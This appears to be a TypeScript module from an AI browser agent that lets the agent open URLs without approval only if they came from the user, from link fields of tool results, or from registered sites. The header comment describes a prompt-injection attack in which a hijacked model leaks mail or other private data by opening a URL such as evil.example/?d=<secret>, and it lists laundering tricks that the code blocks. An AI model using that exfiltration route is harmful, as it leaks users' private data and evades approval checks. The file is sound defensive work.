// =============================================================================
// URL provenance — which addresses the agent may open without asking.
//
// The agent reads untrusted pages, so a prompt-injected model can try to leak
// what it has seen (mail, other tabs, knowledge bases) by opening a URL that
// carries the data: https://evil.example/?d=<secret>. Opening a URL is a GET to
// whoever owns it, so every navigation is a potential outbound message.
//
// A URL can only carry data the model put into it. So navigation is free only
// for URLs the model did not write: ones that came from the user, or from the
// structured link fields of tool results (page hrefs, tab URLs, search results)
// — content that existed before the model saw anything private. URLs on sites
// the user registered as known sites are trusted too. Anything else the model
// composed needs the user's approval (or is refused when nobody is watching).
//
// Two deliberate limits on what counts as "seen":
//   - Only link-like fields of JSON tool results are harvested, never free text,
//     so error messages or page text that echo the model's own input can't
//     launder a composed URL.
//   - A URL that appears inside one of the model's own search queries is never
//     trusted, since a results page can echo the query back as a link.
// =============================================================================

import { unwrapUntrusted } from './untrustedContent';
import { hostMatches } from './url';

/** JSON keys whose string values are treated as links when harvesting tool results. */
const LINK_KEYS = new Set(['url', 'href', 'link', 'weburl', 'weblink', 'pageurl', 'taburl']);

/**
 * Tools whose results come from the browser or the web rather than from the
 * model's own arguments, so their link fields are safe to harvest. Tools that
 * echo model-written values (memory notes, subtask summaries, plans) are left
 * out on purpose: harvesting them would let the model launder a URL it wrote.
 */
export const URL_HARVEST_TOOLS = new Set([
  'list_tabs',
  'get_active_tab',
  'get_tab_content',
  'get_all_tab_contents',
  'read_tab_group',
  'get_element_map',
  'read_app_content',
  'search_web',
  'open_url',
  'navigate',
  'search_known_sites',
  'microsoft365_search',
  'sharepoint_search',
  'calendar_search',
  'search_repo',
  'read_pdf',
  'read_office_document',
]);

/** Tools that fetch a URL given in `args.url` (each is an outbound request). */
export const URL_FETCH_TOOLS = new Set(['navigate', 'open_url', 'read_pdf', 'read_office_document']);

const URL_IN_TEXT = /https?:\/\/[^\s"'<>`\\{}|^]+/gi;
const MAX_KNOWN_URLS = 20000;
const MAX_WALK_DEPTH = 10;
const MAX_WALK_NODES = 50000;

/**
 * Canonical form used for comparisons: http(s) only, no fragment, lowercase
 * host (via URL), no trailing slash on non-root paths. Returns null for
 * anything that isn't an http(s) URL.
 */
export function normalizeNavUrl(raw: string): string | null {
  let u: URL;
  try {
    u = new URL(raw.trim());
  } catch {
    return null;
  }
  if (u.protocol !== 'http:' && u.protocol !== 'https:') return null;
  u.hash = '';
  let s = u.toString();
  if (u.pathname.length > 1 && u.pathname.endsWith('/') && !u.search) s = s.replace(/\/$/, '');
  return s;
}

/** Every http(s) URL written in free text (used for the user's own messages). */
export function extractUrlsFromText(text: string): string[] {
  const out: string[] = [];
  for (const m of text.matchAll(URL_IN_TEXT)) {
    // Trailing punctuation is almost always prose, not part of the URL.
    out.push(m[0].replace(/[.,;:!?)\]]+$/, ''));
  }
  return out;
}

/**
 * Links in a JSON tool result: string values under link-like keys. Free text
 * is ignored on purpose (see the header). Non-JSON results yield nothing.
 */
export function extractLinksFromToolResult(result: string): string[] {
  const trimmed = unwrapUntrusted(result).trimStart();
  if (!trimmed.startsWith('{') && !trimmed.startsWith('[')) return [];
  let data: unknown;
  try {
    data = JSON.parse(trimmed);
  } catch {
    return [];
  }
  const out: string[] = [];
  let nodes = 0;
  const walk = (value: unknown, depth: number): void => {
    if (depth > MAX_WALK_DEPTH || ++nodes > MAX_WALK_NODES || value === null || typeof value !== 'object') return;
    if (Array.isArray(value)) {
      for (const v of value) walk(v, depth + 1);
      return;
    }
    for (const [key, v] of Object.entries(value as Record<string, unknown>)) {
      if (typeof v === 'string') {
        if (LINK_KEYS.has(key.toLowerCase()) && /^https?:\/\//i.test(v)) out.push(v);
      } else {
        walk(v, depth + 1);
      }
    }
  };
  walk(data, 0);
  return out;
}

export type UrlTrust =
  | { trusted: true; why: 'seen' | 'known_site' }
  | { trusted: false; why: 'unseen' | 'not_http' | 'echoed_query' };

/** The set of URLs one conversation (or job) has legitimately seen. */
export class KnownUrls {
  private readonly urls = new Set<string>();
  private readonly queries: string[] = [];

  get size(): number {
    return this.urls.size;
  }

  add(raw: string): void {
    const n = normalizeNavUrl(raw);
    if (!n || this.urls.size >= MAX_KNOWN_URLS) return;
    this.urls.add(n);
  }

  addFromUserText(text: string): void {
    for (const u of extractUrlsFromText(text)) this.add(u);
  }

  addFromToolResult(result: string): void {
    for (const u of extractLinksFromToolResult(result)) this.add(u);
  }

  /** Remember a search query the model issued, so its echoes are never trusted. */
  noteModelQuery(query: string): void {
    const q = query.trim().toLowerCase().slice(0, 2000);
    if (!q) return;
    this.queries.push(q);
    // Also keep the decoded form, so an encoded URL in the query still matches.
    try {
      const decoded = decodeURIComponent(q);
      if (decoded !== q) this.queries.push(decoded);
    } catch {
      // malformed escape — the raw form is enough
    }
  }

  /**
   * May the agent open `raw` without asking? `knownSiteHosts` are hosts of
   * sites the user registered (capabilities / known sites).
   */
  check(raw: string, knownSiteHosts: readonly string[] = []): UrlTrust {
    const n = normalizeNavUrl(raw);
    if (!n) return { trusted: false, why: 'not_http' };
    if (this.echoesModelQuery(n)) return { trusted: false, why: 'echoed_query' };
    const host = new URL(n).hostname;
    if (knownSiteHosts.some((h) => h && hostMatches(host, h))) return { trusted: true, why: 'known_site' };
    if (this.urls.has(n)) return { trusted: true, why: 'seen' };
    return { trusted: false, why: 'unseen' };
  }

  private echoesModelQuery(normalized: string): boolean {
    if (this.queries.length === 0) return false;
    const u = new URL(normalized);
    // Compare the part after the scheme against raw and decoded queries (both
    // kept by noteModelQuery), so an encoded echo still matches.
    const tail = `${u.host}${u.pathname}${u.search}`.toLowerCase().replace(/\/$/, '');
    let decoded = tail;
    try {
      decoded = decodeURIComponent(tail);
    } catch {
      // keep the raw form
    }
    // A bare host carries no data ("example.com" searched, then opened).
    if (u.pathname.length <= 1 && !u.search) return false;
    return this.queries.some((q) => q.includes(tail) || q.includes(decoded));
  }
}
